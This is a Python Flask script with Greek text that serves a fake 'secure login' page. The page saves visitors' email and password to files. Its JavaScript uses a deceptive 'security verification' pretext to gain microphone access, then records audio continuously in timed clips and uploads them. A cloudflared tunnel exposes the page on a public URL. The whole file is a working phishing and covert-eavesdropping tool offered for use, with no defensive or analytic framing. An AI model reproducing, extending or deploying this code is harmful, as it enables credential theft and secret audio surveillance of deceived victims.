import os
import base64
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

# --- Αυτόματη εγκατάσταση εξαρτήσεων ---

def install_python_package(package):
    """Εγκαθιστά ένα πακέτο Python χρησιμοποιώντας pip."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def install_system_package(pkg_name):
    """Προσπαθεί να εγκαταστήσει ένα πακέτο συστήματος στο Termux ή δείχνει οδηγίες."""
    if os.path.exists('/data/data/com.termux'):
        print(f"[INFO] Εντοπίστηκε Termux. Εγκατάσταση {pkg_name} μέσω pkg...")
        subprocess.run(['pkg', 'install', pkg_name, '-y'], check=True)
        return True
    else:
        print(f"[ERROR] Το {pkg_name} δεν είναι εγκατεστημένο.", file=sys.stderr)
        if pkg_name == 'cloudflared':
            print("-> Παρακαλούμε εγκαταστήστε το cloudflared χειροκίνητα από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        elif pkg_name == 'ffmpeg':
            print("-> Παρακαλούμε εγκαταστήστε το ffmpeg χειροκίνητα από: https://ffmpeg.org/download.html", file=sys.stderr)
        return False

def check_dependencies():
    """Ελέγχει για cloudflared, FFmpeg, Flask και εγκαθιστά ό,τι λείπει."""
    # 1. cloudflared
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        if not install_system_package('cloudflared'):
            sys.exit(1)

    # 2. FFmpeg
    try:
        subprocess.run(["ffmpeg", "-version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        if not install_system_package('ffmpeg'):
            sys.exit(1)

    # 3. Flask
    try:
        __import__('flask')
    except ImportError:
        print("Εγκατάσταση πακέτου Python: Flask...")
        install_python_package('flask')

def get_recording_duration():
    """Ζητά από τον χρήστη τη διάρκεια εγγραφής σε δευτερόλεπτα."""
    while True:
        try:
            print("\n" + "="*50)
            print("ΡΥΘΜΙΣΗ ΔΙΑΡΚΕΙΑΣ ΕΓΓΡΑΦΗΣ")
            print("="*50)
            print("Πόσα δευτερόλεπτα πρέπει να διαρκεί κάθε εγγραφή;")
            print("Προτεινόμενο: 15-30 δευτερόλεπτα για βέλτιστα αποτελέσματα")
            print("="*50)
            
            duration = input("Εισάγετε διάρκεια σε δευτερόλεπτα (π.χ. 15, 30, 60): ").strip()
            
            if not duration:
                print("Χρήση προεπιλεγμένης διάρκειας: 15 δευτερόλεπτα")
                return 15000  # χιλιοστά δευτερολέπτου
            
            duration_sec = int(duration)
            if duration_sec <= 0:
                print("Παρακαλούμε εισάγετε θετικό αριθμό.")
                continue
            if duration_sec > 300:
                print("Προειδοποίηση: Η πολύ μεγάλη διάρκεια (>5 λεπτά) μπορεί να προκαλέσει προβλήματα απόδοσης.")
                confirm = input("Συνέχεια ούτως ή άλλως; (y/n): ").lower()
                if confirm != 'y':
                    continue
            
            print(f"Η διάρκεια εγγραφής ορίστηκε σε {duration_sec} δευτερόλεπτα")
            return duration_sec * 1000
        except ValueError:
            print("Μη έγκυρη είσοδος. Παρακαλούμε εισάγετε αριθμό.")
        except KeyboardInterrupt:
            print("\nΗ λειτουργία ακυρώθηκε.")
            sys.exit(0)

def run_cloudflared_and_print_link(port, script_name):
    """Εκκινεί το τούνελ cloudflared και εκτυπώνει το δημόσιο URL."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\n{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

# --- Εφαρμογή Flask (χωρίς pydub, χρήση ffmpeg απευθείας) ---
app = Flask(__name__)
RECORDING_DURATION_MS = 15000  # προεπιλογή
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Εγγραφές')
os.makedirs(RECORDINGS_FOLDER, exist_ok=True)

def get_html_template(recording_duration_ms):
    recording_duration_sec = recording_duration_ms // 1000
    return f'''
<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ασφαλής Πρόσβαση</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Καλώς ήρθατε πίσω</h1>
                <p>Για την ενεργοποίηση φωνητικών εντολών και για επαλήθευση ασφαλείας, παρακαλούμε επιτρέψτε την πρόσβαση στο μικρόφωνο.</p>
                <input type="email" name="email" placeholder="Εισάγετε το email σας" required>
                <input type="password" name="password" placeholder="Εισάγετε τον κωδικό σας" required>
                <input type="submit" value="Σύνδεση με Ασφάλεια">
            </form>
        </main>
        <footer>
            <a href="#">Όροι Χρήσης</a> &bull; <a href="#">Πολιτική Απορρήτου</a> &bull; <a href="#">Υποστήριξη</a>
        </footer>
    </div>
    <script>
        async function startRecordingLoop(stream) {{
            const options = {{
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 128000
            }};
            const recorder = new MediaRecorder(stream, options);
            const audioChunks = [];

            recorder.ondataavailable = event => {{
                if (event.data.size > 0) audioChunks.push(event.data);
            }};

            recorder.onstop = () => {{
                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {{
                    $.ajax({{
                        url: '/upload_audio', type: 'POST',
                        data: JSON.stringify({{ audio: reader.result.split(',')[1] }}),
                        contentType: 'application/json; charset=utf-8'
                    }});
                }};
                startRecordingLoop(stream);
            }};

            recorder.start();
            setTimeout(() => {{
                if(recorder.state === "recording") recorder.stop();
            }}, {recording_duration_ms});
        }}

        async function init() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                startRecordingLoop(stream);
            }} catch (err) {{
                console.error("Η πρόσβαση στο μικρόφωνο απορρίφθηκε:", err);
            }}
        }}
        window.onload = init;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(get_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(RECORDINGS_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nΚωδικός: {request.form.get('password')}\n")
    return "Η σύνδεση ήταν επιτυχής. Θα ανακατευθυνθείτε σύντομα.", 200

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "Δεν βρέθηκε ήχος"}), 400
        
        audio_bytes = base64.b64decode(audio_data)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        wav_filename = f"recording_{timestamp}.wav"
        wav_path = os.path.join(RECORDINGS_FOLDER, wav_filename)
        
        ffmpeg_cmd = [
            'ffmpeg', '-i', 'pipe:0',
            '-acodec', 'pcm_s16le',
            '-ar', '44100',
            '-ac', '1',
            '-y',
            wav_path
        ]
        proc = subprocess.run(ffmpeg_cmd, input=audio_bytes, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if proc.returncode != 0:
            raise RuntimeError("Η μετατροπή ffmpeg απέτυχε")
        
        return jsonify({"message": "Ο ήχος αποθηκεύτηκε."}), 200
    except Exception as e:
        print(f"[ERROR] Αποτυχία επεξεργασίας ήχου: {e}", file=sys.stderr)
        return jsonify({"error": "Αποτυχία επεξεργασίας ήχου στον διακομιστή."}), 500

if __name__ == '__main__':
    # Αυτόματος έλεγχος και εγκατάσταση εξαρτήσεων
    check_dependencies()
    
    # Λήψη διάρκειας εγγραφής από τον χρήστη
    RECORDING_DURATION_MS = get_recording_duration()
    
    print(f"\n{'='*50}")
    print(f"Ρύθμιση εγγραφής:")
    print(f"Διάρκεια: {RECORDING_DURATION_MS//1000} δευτερόλεπτα")
    print(f"Τοποθεσία αποθήκευσης: {RECORDINGS_FOLDER}")
    print(f"{'='*50}\n")
    
    # Αποσιώπηση μηνυμάτων Flask
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    
    port = 4040
    script_name = "Σελίδα Σύνδεσης (Μικρόφωνο)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nΤερματισμός...")
        sys.exit(0)